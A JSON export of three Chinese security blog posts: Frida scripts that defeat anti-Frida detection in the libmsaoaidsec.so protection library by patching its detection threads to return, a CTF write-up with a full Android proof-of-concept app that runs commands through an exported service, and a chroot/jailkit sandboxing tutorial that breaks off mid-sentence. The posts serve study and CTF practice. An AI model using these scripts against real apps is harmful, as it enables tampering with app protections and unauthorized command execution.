[{"title":"frida绕过检测学习","url":"/2025/03/02/frida%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%E5%AD%A6%E4%B9%A0/","content":"检测点检测Frida的机制一般在Native层实现，通常会创建几个线程轮询检测。\n查看检测的so先检查检测部分的代码在哪里\nInterceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),      &#123;          onEnter: function (args) &#123;              var pathptr = args[0];              if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                  var path = ptr(pathptr).readCString();                  console.log(&quot;load &quot; + path);              &#125;          &#125;      &#125;  );\n然后运行，查看在哪里停止加载现在得到了它检测的so文件libmsaoaidsec.so\n脚本执行方法这里尝试使用了两种方法来执行frida脚本\n\nAttach 模式：适合调试已经运行的应用，但可能错过应用启动阶段的重要代码。\nSpawn 模式：通过启动新进程并提前注入脚本，确保捕获从启动开始的所有行为，适合需要早期 Hook 的情况。Attachfrida -U &quot;进程名“ -l 脚本文件  失败了\n\nSpawnfrida -U -f 包名 -l 脚本名称  成功了\n\nso的加载流程dlopen用来打开一个动态链接库，将其装入内存\ndlopen内存装载，loadlibrary加载调用在高版本Android，dlopen改成android_dlopen_ext\nlinker会先对so进行加载与链接，然后调用so的.init_proc函数，接着调用.init_array中的函数，最后才是JNI_OnLoad函数。\n检测具体加载点使用frida hook JNI_OnLoad函数，如果调用了该函数就输出一行日志，如果没有日志输出，那么就说明检测点在.init_xxx函数中，注入的时机可以选择dlopen加载libmsaoaidsec.so完成之后。\nfunction hook_dlopen(soName = &#x27;&#x27;) &#123;      Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),          &#123;              onEnter: function (args) &#123;                  var pathptr = args[0];                  if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                      var path = ptr(pathptr).readCString();                      if (path.indexOf(soName) &gt;= 0) &#123;                          this.is_can_hook = true;                      &#125;                  &#125;              &#125;,              onLeave: function (retval) &#123;                  if (this.is_can_hook) &#123;                      hook_JNI_OnLoad()                  &#125;              &#125;          &#125;      );  &#125;    function hook_JNI_OnLoad()&#123;      let module = Process.findModuleByName(&quot;libmsaoaidsec.so&quot;)      Interceptor.attach(module.base.add(0xC6DC + 1), &#123;          onEnter(args)&#123;              console.log(&quot;call JNI_OnLoad&quot;)          &#125;      &#125;)  &#125;    setImmediate(hook_dlopen, &quot;libmsaoaidsec.so&quot;)\n直接结束了说明关键检测点在.init_proc 或.init_array函数里\n但是dlopen函数调用完之后.init_xxxx函数已经执行完了，这个时候不容易使用frida进行hookhook linker的call_function并不容易，这里面涉及到linker的自举。所以这里有一个新的思路：在.init_proc函数中找一个调用了外部函数的位置，时机越早越好\npthread_createpthread_create 是 POSIX 线程库中的函数，用于创建新线程。许多应用程序利用它来实现反调试或反 Frida 检测，例如通过线程检查进程内存或状态，检测 Frida 的存在。应用程序的反 Frida 保护通常会通过 pthread_create 创建守护线程，周期性地扫描内存（如 &#x2F;proc&#x2F;self&#x2F;maps）或检查特定字符串（如“frida”），以检测 Frida 的注入。\n那么先查找没有直接出现pthread_create尝试hook \nvar interceptor = Interceptor.attach(Module.findExportByName(null, &quot;pthread_create&quot;),      &#123;          onEnter: function (args) &#123;              var module = Process.findModuleByAddress(ptr(this.returnAddress))              if (module != null) &#123;                  console.log(&quot;[pthread_create] called from&quot;, module.name)              &#125;              else &#123;                  console.log(&quot;[pthread_create] called from&quot;, ptr(this.returnAddress))              &#125;          &#125;,      &#125;  )\n\n检测到了libmsaoaidsec.so对pthread_create的使用\n查看检测的线程——查找偏移Hook pthread_create 函数，记录调用该函数创建线程的模块信息（模块名、线程函数偏移量、参数）。\nfunction check_pthread_create(name = null) &#123;      var pthread_create_addr = Module.findExportByName(null, &#x27;pthread_create&#x27;);        var pthread_create = new NativeFunction(pthread_create_addr, &quot;int&quot;, [&quot;pointer&quot;, &quot;pointer&quot;, &quot;pointer&quot;, &quot;pointer&quot;]);      Interceptor.replace(pthread_create_addr, new NativeCallback(function (parg0, parg1, parg2, parg3) &#123;          var module = Process.findModuleByAddress(parg2)          var so_base = module.base;          var off = &quot;0x&quot; + parg2.sub(so_base).toString(16)          var so_name = module.name;          console.log(so_name, off, parg3)            return pthread_create(parg0, parg1, parg2, parg3);          &#125;, &quot;int&quot;, [&quot;pointer&quot;, &quot;pointer&quot;, &quot;pointer&quot;, &quot;pointer&quot;]))  &#125;  setImmediate(check_pthread_create)\n能看到libmsaoaidsec.so具体检测的地方在这里终止!可以得到它加载的线程和偏移接下来的思路就是nop掉它进行检测的线程\n尝试绕过静态分析so——确定具体hook点解包apk来获取libmsaoaidsec.so\njava -jar apktool.jar d malware.apk -o output_folder\n从这个函数开始看 .init_proc在这里选择一个尽量早执行并且使用外部函数的函数得到sub_123f0函数，可以看到它执行了一个sdk接下来就关注_system_property_get\nfunction locate_init() &#123;      let r = null      Interceptor.attach(Module.findExportByName(null, &quot;__system_property_get&quot;),          &#123;              onEnter: function (args) &#123;                  var name = args[0];                  if (name !== undefined &amp;&amp; name != null) &#123;                      name = ptr(name).readCString();                      console.log(name)                      if (name.indexOf(&quot;ro.build.version.sdk&quot;) &gt;= 0) &#123;                          console.log(Process.findModuleByName(&quot;libmsaoaidsec.so&quot;).base)                      &#125;                  &#125;              &#125;          &#125;      );  &#125;    Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),      &#123;          onEnter: function (args) &#123;              var pathptr = args[0];              if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                  var path = ptr(pathptr).readCString();                  if(path.search(&quot;libmsaoaidsec.so&quot;) != -1)&#123;                      this.hook = true                      locate_init()                  &#125;              &#125;          &#125;      &#125;  );\n控制台的输出得到了基址0x71ea845000，接着去尝试nop掉关键部分就好了\n平坦流去混淆代码结构中有大量的while和if else分析完这个后可以找到加载早的函数有哪些\n在获取了一个非常早的注入时机之后，就可以定位具体的frida检测点了。网上对frida的检测通常会使用openat、open、strstr、pthread_create、snprintf、sprintf、readlinkat等一系列函数，\n关键noplocate_init函数在检测到ro.build.version.sdk属性被读取时，会找到目标库的基地址，并对三个偏移地址（0x1c544、0x1b8d4、0x26e5c）调用nop_64函数。nop_64函数的作用是将指定地址的指令替换为ret返回指令，从而绕过这些函数的执行。\nfunction locate_init() &#123;      let r = null      Interceptor.attach(Module.findExportByName(null, &quot;__system_property_get&quot;),          &#123;              onEnter: function (args) &#123;                  var name = args[0];                  if (name !== undefined &amp;&amp; name != null) &#123;                      name = ptr(name).readCString();                      //console.log(name)                      if (name.indexOf(&quot;ro.build.version.sdk&quot;) &gt;= 0) &#123;                          var  r = Process.findModuleByName(&quot;libmsaoaidsec.so&quot;)                          nop_64(r.base.add(&quot;0x1c544&quot;))                          nop_64(r.base.add(&quot;0x1b8d4&quot;))                          nop_64(r.base.add(&quot;0x26e5c&quot;))                      &#125;                  &#125;              &#125;          &#125;      );  &#125;    Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),      &#123;          onEnter: function (args) &#123;              var pathptr = args[0];              if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                  var path = ptr(pathptr).readCString();                  if(path.search(&quot;libmsaoaidsec.so&quot;) != -1)&#123;                      this.hook = true                      locate_init()                  &#125;              &#125;          &#125;      &#125;  );    function nop_64(addr) &#123;      Memory.protect(addr, 4 , &#x27;rwx&#x27;);      var w = new Arm64Writer(addr);      w.putRet();      w.flush();      w.dispose();  &#125;\n成功进去\n尝试绕过pthread_create检测——其他思路在执行libmsaoaidsec.so时nop掉pthread_create,或者替换它的返回结果来自https://blog.csdn.net/A_fanyifan/article/details/143864007直接使用就可以，甚至偏移都是一样的\nfunction hook_dlopen(soName = &#x27;&#x27;) &#123;      Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),          &#123;              onEnter: function (args) &#123;                  var pathptr = args[0];                  if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                      var path = ptr(pathptr).readCString();                      if (path.indexOf(soName) &gt;= 0) &#123;                          locate_init()                      &#125;                  &#125;              &#125;          &#125;      );  &#125;    function locate_init() &#123;      let secmodule = null      Interceptor.attach(Module.findExportByName(null, &quot;__system_property_get&quot;),          &#123;              // _system_property_get(&quot;ro.build.version.sdk&quot;, v1);              onEnter: function (args) &#123;                  secmodule = Process.findModuleByName(&quot;libmsaoaidsec.so&quot;)                  var name = args[0];                  if (name !== undefined &amp;&amp; name != null) &#123;                      name = ptr(name).readCString();                      if (name.indexOf(&quot;ro.build.version.sdk&quot;) &gt;= 0) &#123;                          // 这是.init_proc刚开始执行的地方，是一个比较早的时机点                          // do something                          // hook_pthread_create()                        bypass()                      &#125;                  &#125;              &#125;          &#125;      );  &#125;    function hook_pthread_create() &#123;      console.log(&quot;libmsaoaidsec.so --- &quot; + Process.findModuleByName(&quot;libmsaoaidsec.so&quot;).base)      Interceptor.attach(Module.findExportByName(&quot;libc.so&quot;, &quot;pthread_create&quot;), &#123;          onEnter(args) &#123;              let func_addr = args[2]              console.log(&quot;The thread function address is &quot; + func_addr)          &#125;      &#125;)  &#125;    function nopFunc(parg2) &#123;      // 修改内存保护，使其可写      Memory.protect(parg2, 4, &#x27;rwx&#x27;);      // 使用 Arm64Writer 写入 &#x27;ret&#x27; 指令      var writer = new Arm64Writer(parg2);      writer.putRet();      writer.flush();      writer.dispose();      console.log(&quot;nop &quot; + parg2 + &quot; success&quot;);  &#125;    function bypass()&#123;      let module = Process.findModuleByName(&quot;libmsaoaidsec.so&quot;)      nopFunc(module.base.add(0x1c544))      nopFunc(module.base.add(0x1b8d4))      nopFunc(module.base.add(0x26e5c))    &#125;  // pthread\\_create libmsaoaidsec.so 0x1c544 0x731552b960\\  // pthread\\_create libmsaoaidsec.so 0x1b8d4 0x0\\  // pthread\\_create libmsaoaidsec.so 0x26e5c 0x0    setImmediate(hook_dlopen, &quot;libmsaoaidsec.so&quot;)\n\nfake替换function create_fake_pthread_create() &#123;      const fake_pthread_create = Memory.alloc(4096)      Memory.protect(fake_pthread_create, 4096, &quot;rwx&quot;)      Memory.patchCode(fake_pthread_create, 4096, code =&gt; &#123;          const cw = new Arm64Writer(code, &#123; pc: ptr(fake_pthread_create) &#125;)          cw.putRet()      &#125;)      return fake_pthread_create  &#125;    function hook_dlsym() &#123;      var count = 0      console.log(&quot;=== HOOKING dlsym ===&quot;)      var interceptor = Interceptor.attach(Module.findExportByName(null, &quot;dlsym&quot;),          &#123;              onEnter: function (args) &#123;                  const name = ptr(args[1]).readCString()                  console.log(&quot;[dlsym]&quot;, name)                  if (name == &quot;pthread_create&quot;) &#123;                      count++                  &#125;              &#125;,              onLeave: function(retval) &#123;                  if (count == 1) &#123;                      retval.replace(fake_pthread_create)                  &#125;                  else if (count == 2) &#123;                      retval.replace(fake_pthread_create)                      // 完成2次替换, 停止hook dlsym                      interceptor.detach()                  &#125;              &#125;          &#125;      )      return Interceptor  &#125;    function hook_dlopen() &#123;      var interceptor = Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),          &#123;              onEnter: function (args) &#123;                  var pathptr = args[0];                  if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                      var path = ptr(pathptr).readCString();                      console.log(&quot;[LOAD]&quot;, path)                      if (path.indexOf(&quot;libmsaoaidsec.so&quot;) &gt; -1) &#123;                          hook_dlsym()                      &#125;                  &#125;              &#125;          &#125;      )      return interceptor  &#125;    // 创建虚假pthread_create  var fake_pthread_create = create_fake_pthread_create()  var dlopen_interceptor = hook_dlopen()\n\nhttps://bbs.kanxue.com/thread-281584.htm\n参考资料https://bbs.kanxue.com/thread-255674.htmhttps://blog.bingyue.top/2025/01/08/an_zhuo_ni_xiang_an_li_001/https://blog.csdn.net/A_fanyifan/article/details/143864007https://bbs.kanxue.com/thread-281584.htm\n"},{"title":"BitSiegeCTF2025-Watcher","url":"/2025/05/06/BitSiegeCTF2025-Watcher/","content":"前置分析题目描述题目下载链接:https://github.com/0xbinder/BitCTF-2025/blob/main/watcher.apk打开modsf，获取到它的基本信息和暴露的组件\nPackage Name： com.example.watcherexported services：com.example.watcher.WatcherService\n查看WatcherService的代码，可以发现它里面有命令执行相关的代码，纳米就可以利用它这个暴露的WatcherService来尝试进行命令执行题目要求说的是编写一个app来触发命令执行，接下来就是看具体的交互和代码编写\n代码分析打开WatcherService.java,分析代码执行流程主要处理这三个情况\npublic static final int MSG_ECHO = 1;public static final int MSG_GET_SECRET = 2;public static final int MSG_RUN_COMMAND = 3;\ncase3和命令执行相关，里面包含了一个一次性secret的检查，下面是secret相关代码\nWatcherService.this.currentRequestedSecret = UUID.randomUUID().toString();String providedSecret = message.getData().getString(&quot;secret&quot;);else if (WatcherService.this.currentRequestedSecret == null || !WatcherService.this.currentRequestedSecret.equals(providedSecret)) \n如果成功的话，就会执行这个代码\nString commandOutput = Handlers.executeCommand(command);\n那么现在点击Handlers来处理命令执行相关的代码它这里有两个判断,如果sdk的版本大于26那么会对传入的数据进行两次base64解码，也就是说我们传入的初始字符要经过两次base64加密后再传入(我使用的sdk是29，所以我需要遵循两次加密)\nif (Build.VERSION.SDK_INT &gt;= 26) &#123;            singleDecodedCommand = new String(Base64.getDecoder().decode(doubleEncodedCommand));        &#125;        String command = null;        if (Build.VERSION.SDK_INT &gt;= 26) &#123;            command = new String(Base64.getDecoder().decode(singleDecodedCommand));        &#125;\n解密没有问题后就会开始执行代码\nProcess process = Runtime.getRuntime().exec(command);\n\n为什么以API26为界限呢因为java.util.Base64是在 Android API 级别 26 (Android 8.0 Oreo) 才被正式引入并保证可用的。API26之前是使用android.util.Base64。在这题中没有处理API26之后的情况，如果是API26之后，解码步骤会被跳过，command会为null,程序无法执行\n编写pocIBinder 是一个通信接口，定义了外部应用可以如何与该 Service 交互,onBind 返回了 messenger.getBinder()。外部应用拿到这个 IBinder 后，就可以创建一个 Messenger 对象，从而能够向 WatcherService 的 IncomingHandler 发送 Message。\npublic IBinder onBind(Intent intent) &#123;        return this.messenger.getBinder();    &#125;\n\n连接service进行连接绑定到目标service\nprotected void onStart() &#123;      Intent intent = new Intent();      //绑定目标app和目标服务    intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_SERVICE));      try &#123;          bindService(intent, mConnection, Context.BIND_AUTO_CREATE);        //BIND_AUTO_CREATE:只要存在绑定，就自动创建服务。    &#125; &#125;\n客户端通过调用 bindService() 绑定到服务。调用时，它必须提供 ServiceConnection 的实现，后者会监控与服务的连接。调用 bindService() 指示 请求的服务是否存在，以及是否允许客户端访问该服务。时间 Android 系统会在客户端与服务之间创建连接， 致电 onServiceConnected() （在 ServiceConnection 上）。通过 onServiceConnected() 方法包含 IBinder 参数，客户端随后会使用该参数与绑定服务进行通信。\n处理连接\nprivate final ServiceConnection mConnection = new ServiceConnection() &#123;      @Override      public void onServiceConnected(ComponentName name, IBinder service) &#123;    //name:服务已连接的组件的具体名称。    //service:服务通信通道的 IBinder，您现在可以对其进行调用。    mServiceMessenger = new Messenger(service);    //WatcherService 使用 Messenger 进行通信，并且它的 onBind 返回的是其内部 Messenger 的 Binder (messenger.getBinder())。所以，我们用 WatcherService 返回的这个 IBinder (service) 来创建一个新的 Messenger 对象 (mServiceMessenger)。这个 mServiceMessenger 现在就指向了 WatcherService 内部的 IncomingHandler，可以用来向 WatcherService发送消息了。    &#125;\tpublic void onServiceDisconnected (ComponentName name)&#123;\t//name:该服务的具体组件名称，其连接已丢失。\t&#125;\n\n处理一次性secret请求secret\nMessage getSecretMsg = Message.obtain(null, MSG_GET_SECRET); //Handler h:null:在创建要跨进程发送的消息时，源 Handler 通常设为 null。//int what:MSG_GET_SECRETgetSecretMsg.replyTo = mReplyMessenger;  try &#123;      mServiceMessenger.send(getSecretMsg);      //向WatcherService发送信息，最终WatcherService的 public void handleMessage(Message message)处理信息&#125;\n\n存储secretmReplyMessenger用ReplyHandler处理回复的信息\nString reply = msg.getData() != null ? msg.getData().getString(KEY_REPLY) : null;//匹配键值对（在watcherservice的sendReply设置）提取reply（回复的信息）switch (msg.what) &#123;      case MSG_GET_SECRET:\t    mReceivedSecret = reply;\t    //保存回复的信息（一次性secret)\t    sendCommand();\t    //并且就在这里马上进行执行指令，因为这个口令是一次性的，每次请求都不一样\n\n\n发送指令准备指令\nString command = &quot;id&quot;; // The command to execute  String doubleEncodedCommand = doubleEncodeBase64(command);//进行两次base64加密，对应handler的两次base64解码bundle.putString(KEY_SECRET, mReceivedSecret);  bundle.putString(KEY_COMMAND, doubleEncodedCommand);runCmdMsg.setData(bundle);//准备对象池，设立键值对，需要一次性secret和目标command\n\n进行指令的发送并处理消息回复\nrunCmdMsg.replyTo = mReplyMessenger;mServiceMessenger.send(runCmdMsg);\n\n\n完整的MainActivity.javapackage com.example.watchpoc;    import androidx.appcompat.app.AppCompatActivity;    import android.content.ComponentName;  import android.content.Context;  import android.content.Intent;  import android.content.ServiceConnection;  import android.os.Bundle;  import android.os.Handler;  import android.os.IBinder;  import android.os.Looper;  import android.os.Message;  import android.os.Messenger;  import android.os.RemoteException;  import android.util.Log;  import android.widget.Button;  import android.widget.TextView;  import android.widget.Toast;    import java.nio.charset.StandardCharsets;  import java.util.Base64; // Requires API 26+    public class MainActivity extends AppCompatActivity &#123;        private static final String TAG = &quot;MinimalPOC&quot;;      private static final String TARGET_PACKAGE = &quot;com.example.watcher&quot;; // Target App      private static final String TARGET_SERVICE = &quot;com.example.watcher.WatcherService&quot;; // Target Service        // Message codes from WatcherService    private static final int MSG_GET_SECRET = 2;      private static final int MSG_RUN_COMMAND = 3;      // Bundle keys from WatcherService      private static final String KEY_SECRET = &quot;secret&quot;;      private static final String KEY_COMMAND = &quot;command&quot;;      private static final String KEY_REPLY = &quot;reply&quot;;        private Messenger mServiceMessenger = null; // Sends messages to target service      private boolean mIsBound = false;      private String mReceivedSecret = null;        // Receives replies from target service      private final Messenger mReplyMessenger = new Messenger(new ReplyHandler(Looper.getMainLooper()));        private Button buttonRun;      private TextView textOutput;        // Handles replies from WatcherService      private class ReplyHandler extends Handler &#123;          public ReplyHandler(Looper looper) &#123; super(looper); &#125;            @Override          public void handleMessage(Message msg) &#123;              String reply = msg.getData() != null ? msg.getData().getString(KEY_REPLY) : null;              Log.d(TAG, &quot;Reply received: what=&quot; + msg.what + &quot;, reply=&quot; + reply);                switch (msg.what) &#123;                  case MSG_GET_SECRET:                      if (reply != null &amp;&amp; !reply.startsWith(&quot;Error&quot;)) &#123;                          mReceivedSecret = reply;                          textOutput.append(&quot;\\nSecret received: &quot; + mReceivedSecret);                          // Now send the command                          sendCommand();                      &#125; else &#123;                          textOutput.append(&quot;\\nError getting secret: &quot; + reply);                          Log.e(TAG, &quot;Failed to get secret: &quot; + reply);                          buttonRun.setEnabled(true);                     &#125;                      break;                  case MSG_RUN_COMMAND:                      textOutput.append(&quot;\\nCommand Output:\\n&quot; + reply);                      Log.i(TAG, &quot;Command output received.&quot;);                      buttonRun.setEnabled(true);                     break;                  default:                      super.handleMessage(msg);              &#125;          &#125;      &#125;        // Connects/disconnects from WatcherService      private final ServiceConnection mConnection = new ServiceConnection() &#123;          @Override          public void onServiceConnected(ComponentName name, IBinder service) &#123;              mServiceMessenger = new Messenger(service);              mIsBound = true;              buttonRun.setEnabled(true);              textOutput.setText(&quot;Service Connected. Ready.&quot;);              Log.i(TAG, &quot;Watcher Service connected.&quot;);          &#125;            @Override          public void onServiceDisconnected(ComponentName name) &#123;              mServiceMessenger = null;              mIsBound = false;              buttonRun.setEnabled(false);              textOutput.setText(&quot;Service Disconnected.&quot;);              Log.w(TAG, &quot;Watcher Service disconnected.&quot;);          &#125;      &#125;;        @Override      protected void onCreate(Bundle savedInstanceState) &#123;          super.onCreate(savedInstanceState);          setContentView(R.layout.activity_main);            buttonRun = findViewById(R.id.button_run);          textOutput = findViewById(R.id.text_output);            buttonRun.setEnabled(false);          buttonRun.setOnClickListener(v -&gt; startExploit());      &#125;        @Override      protected void onStart() &#123;          super.onStart();          textOutput.setText(&quot;Binding to Watcher Service...&quot;);          Intent intent = new Intent();          intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_SERVICE));          try &#123;              bindService(intent, mConnection, Context.BIND_AUTO_CREATE);          &#125; catch (Exception e) &#123;              textOutput.setText(&quot;Error binding: &quot; + e.getMessage() + &quot;\\nIs Watcher installed?&quot;);              Log.e(TAG, &quot;Error binding&quot;, e);          &#125;      &#125;        @Override      protected void onStop() &#123;          super.onStop();          if (mIsBound) &#123;              unbindService(mConnection);              mIsBound = false;              mServiceMessenger = null;              buttonRun.setEnabled(false);              Log.d(TAG, &quot;Unbound from service.&quot;);          &#125;      &#125;        // --- Exploit Steps ---        private void startExploit() &#123;          if (!mIsBound) &#123;              Toast.makeText(this, &quot;Service not bound&quot;, Toast.LENGTH_SHORT).show();              return;          &#125;          buttonRun.setEnabled(false);         textOutput.setText(&quot;Requesting secret...&quot;);          mReceivedSecret = null; // Reset previous secret            // 1. Request the secret                 Message getSecretMsg = Message.obtain(null, MSG_GET_SECRET);          getSecretMsg.replyTo = mReplyMessenger;          try &#123;              mServiceMessenger.send(getSecretMsg);              Log.d(TAG, &quot;Sent MSG_GET_SECRET&quot;);          &#125; catch (RemoteException e) &#123;              textOutput.setText(&quot;Error sending get_secret: &quot; + e.getMessage());              Log.e(TAG, &quot;Failed to send MSG_GET_SECRET&quot;, e);              buttonRun.setEnabled(true);          &#125;      &#125;        private void sendCommand() &#123;          if (!mIsBound || mReceivedSecret == null) &#123;              textOutput.append(&quot;\\nCannot send command (not bound or no secret)&quot;);              Log.e(TAG, &quot;sendCommand called but not ready (bound=&quot; + mIsBound + &quot;, secret=&quot; + mReceivedSecret + &quot;)&quot;);              buttonRun.setEnabled(true);              return;          &#125;            textOutput.append(&quot;\\nSending &#x27;id&#x27; command...&quot;);            // 2. Prepare the command          String command = &quot;id&quot;;           String doubleEncodedCommand = doubleEncodeBase64(command);            if (doubleEncodedCommand == null) &#123;              textOutput.append(&quot;\\nError: Failed to Base64 encode command.&quot;);              Log.e(TAG, &quot;Double Base64 encoding failed&quot;);              buttonRun.setEnabled(true);              return;          &#125;            // 3. Send the command message          Message runCmdMsg = Message.obtain(null, MSG_RUN_COMMAND);          Bundle bundle = new Bundle();          bundle.putString(KEY_SECRET, mReceivedSecret);          bundle.putString(KEY_COMMAND, doubleEncodedCommand); // Use the encoded command          runCmdMsg.setData(bundle);          runCmdMsg.replyTo = mReplyMessenger;            try &#123;              mServiceMessenger.send(runCmdMsg);              Log.d(TAG, &quot;Sent MSG_RUN_COMMAND&quot;);          &#125; catch (RemoteException e) &#123;              textOutput.append(&quot;\\nError sending command: &quot; + e.getMessage());              Log.e(TAG, &quot;Failed to send MSG_RUN_COMMAND&quot;, e);              buttonRun.setEnabled(true);          &#125;      &#125;            private String doubleEncodeBase64(String input) &#123;          try &#123;              byte[] singleEncoded = Base64.getEncoder().encode(input.getBytes(StandardCharsets.UTF_8));              byte[] doubleEncoded = Base64.getEncoder().encode(singleEncoded);              return new String(doubleEncoded, StandardCharsets.UTF_8);          &#125; catch (Exception e) &#123;              Log.e(TAG, &quot;Base64 encoding failed&quot;, e);              return null;          &#125;      &#125;  &#125;\n\n对应的activity_main.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  &lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;      android:layout_width=&quot;match_parent&quot;      android:layout_height=&quot;match_parent&quot;      android:orientation=&quot;vertical&quot;      android:padding=&quot;16dp&quot;&gt;        &lt;Button        android:id=&quot;@+id/button_run&quot;          android:layout_width=&quot;match_parent&quot;          android:layout_height=&quot;wrap_content&quot;          android:text=&quot;Run &#x27;id&#x27; command on Watcher&quot; /&gt;        &lt;TextView        android:id=&quot;@+id/text_output&quot;          android:layout_width=&quot;match_parent&quot;          android:layout_height=&quot;wrap_content&quot;          android:layout_marginTop=&quot;16dp&quot;          android:text=&quot;Output will appear here...&quot;          android:textAppearance=&quot;@style/TextAppearance.AppCompat.Medium&quot;          android:textIsSelectable=&quot;true&quot;/&gt;    &lt;/LinearLayout&gt;\n\n\n"},{"title":"linux沙箱之文件系统隔离","url":"/2024/09/21/linux%E6%B2%99%E7%AE%B1%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%9A%94%E7%A6%BB/","content":"chroot介绍通常来说，提到chroot一般有两个含义，chroot(1)是&#x2F;usr&#x2F;bin&#x2F;chroot,要有一定权限才能使用chroot, chroot(2)是glibc中的一个函数,属于系统调用\n\nchroot(1)chroot - run command or interactive shell with special root directory 一个命令行工具，可用于创建沙箱shell，用于交互式 shell 或命令的文件系统隔离\n\nchroot [OPTION] NEWROOT [COMMAND [ARG]…]sudo chroot /my/new/root /bin/bash这将启动一个 Bash shell，并将 /my/new/root 作为新根目录。\n\n影响范围：只限于执行 chroot 后启动的进程以及它们的子进程。例如，如果你在一个 shell 中执行 chroot /my/new/root /bin/bash，那么这个新启动的 Bash shell和它的子进程会在 /my/new/root 作为根目录的环境下运行。\n不影响其他 shell：其他已经存在的 shell，或者你之后在原始环境中启动的 shell，都不受 chroot 的影响，它们仍然使用原来的根目录。\n\nchroot(2)chroot - change root directory 用于编程接口下的根目录更改\n\nint chroot(const char *path);path：要作为新根目录的路径。返回值：成功返回 0，失败返回 -1，并设置 errno 来指示错误类型。\n\nchroot的主要功能就是改变根目录\n看起来很鸡肋，但是当你的电脑被入侵，而对方入侵的是你的chroot环境，那么他使用cd..&#x2F;就永远跳不出来，比如将chroot设置为&#x2F;tmp&#x2F;jail,他就只能到达&#x2F;tmp&#x2F;jail，不能到达真正的root位置，这样入侵者就只能在特定的文件里运行，将伤害限制在chroot沙盒\n但是要注意使用，一般在测试的时候（也就是设置正确的时候）你能独立的操作chroot空间，也能很轻松的退出来。但如果设置错误(没有使用chdir”&#x2F;“），你的真实根目录就会完全变成chroot的根目录，但是能使用cd退出去 cd..&#x2F;..&#x2F;\nchroot使用及注意事项sudo chroot /tmp/jail /bin/bash\n\n这样执行后会运行错误，因为chroot目录里没有库，可以说，它什么也没有\nchroot 目录最初的状态：\n没有系统工具：在 chroot 环境中最初是没有 bash、ls、cat 等常用工具的，除非你手动将它们复制进去。\n\n没有库文件：任何程序在运行时所需的库文件也不会自动存在，必须手动添加。即使你将 /bin/bash 复制到 chroot 目录中，仍然需要手动复制与之相关的依赖库。\n\n没有配置文件：/etc/passwd、/etc/group、/etc/hosts 等系统配置文件也不会存在，需要手动配置或复制。\n\n目录结构：你需要手动创建或复制常见的目录结构，如 /bin、/lib、/etc、/home、dev 等，以使 chroot 环境类似于一个完整的系统。\n\n\n虽然 chroot 在用户空间内，但文件系统隔离\n尽管 chroot 环境位于用户空间，它的工作原理是通过文件系统的隔离机制，给进程提供一个新的文件系统视图。在默认情况下，Linux 的文件系统是全局共享的，任何进程都可以访问 /bin、/usr 等目录。然而，通过 chroot，你可以将某个进程的文件系统访问限制在一个特定的目录下，防止其访问全局的系统资源\n在这种情况下，可以安装busybox\nhttps://www.busybox.net/\nBusyBox 是一个集成了一百多个最常用Linux 命令和工具（如 cat 、 echo 、 grep 、 mount 、 telnet 等）的精简工具箱,将它装入chroot目录即可正常执行命令\njailkit——将攻击者关进chroot jailhttps://olivier.sessink.nl/jailkit/\n\nJailkit 是一套实用程序，用于增强 chroot jails 的可能性。Jailkit 包含一组工具和配置文件，用于自动部署 chroot jails。Jailkit 还包含各种工具，用于将用户帐户限制为特定文件或特定命令，这些工具可通过配置文件进行配置。设置 chroot shell、限制为某些特定命令的 shell 或 chroot jail 内的守护进程要容易得多，并且可以使用这些实用程序自动完成。\n\n\nJailkit 是一套专门为安全而开发的工具。如果配置、系统设置或环境不是 100% 安全，它将以安全的方式中止，并向系统日志发送有用的日志消息来解释哪里出了问题。\n\n\nJailkit 是一款非常稳定的软件，拥有非常稳定和高质量的代码库。据悉，它被多家领先的 IT 安全公司的网络安全设备、多家大型企业的互联网服务器、互联网服务提供商的互联网服务器以及许多需要保护 cvs、sftp、shell 或守护进程的小型公司和私人用户所采用。\n\n使用1.安装\nsudo apt-get install jailkit\n\n\n创建 Jail 环境\n\n使用 Jailkit 的 jk_init 命令来初始化 chroot jail 环境。创建一个目录作为新的根目录，并配置一些基础命令和工具。\nsudo mkdir /home/jailsudo jk_init -v /home/jail basicshell\n\n\nbasicshell 是 Jailkit 提供的一组预定义的环境配置，它包括基本的 shell 工具，如 ls、cp、mv 等，供用户在 jail 中使用。\n\n\n将用户放入 Jail\n\n使用 jk_jailuser 命令将用户 attacker 限制在 chroot jail 中：\nsudo jk_jailuser -m -j /home/jail attacker\n\n这会将 attacker 用户添加到 chroot jail 中，并确保该用户只能访问 jail 中的文件系统。\n\n测试 Jail 环境\n\n以用户 attacker 身份登录系统，检查是否被限制在 chroot jail 中：\nsu - attacker\n\n\n登录成功后，用户会发现根目录 / 实际上是 /home/jail，且无法访问系统的其他文件。\n\n扩展用法\n以上方法是把攻击者关进新的环境，但如果攻击者一开始就偷偷进入系统并新建用户，还在自己的用户下留了恶意文件呢，如何不让攻击者发现自己被发现了\n\n这个操作比较繁琐我就不一一写了，关键步骤就是新建一个home/jail/home/username(已存在用户），然后将原用户的文件都复制进去，相应的权限都要一一转移，并且要确保已存在用户对home/jail/home/username操作的权限sudo chown -R existinguser:existinguser /home/jail/home/existinguser\n\n如果在上面的步骤里不小心把自己的用户关进去了，如何释放\n\n\n修改用户的登录 shell\n\n当将用户放入 Jailkit 管理的 chroot jail 环境时，通常会将用户的默认 shell 设置为 jk_chrootsh，jk_chrootsh 是 Jailkit 提供的一种特殊 shell，它能够在用户登录时，自动将该用户的根目录限制在指定的 chroot 环境中。要移出 jail，首先需要将用户的 shell 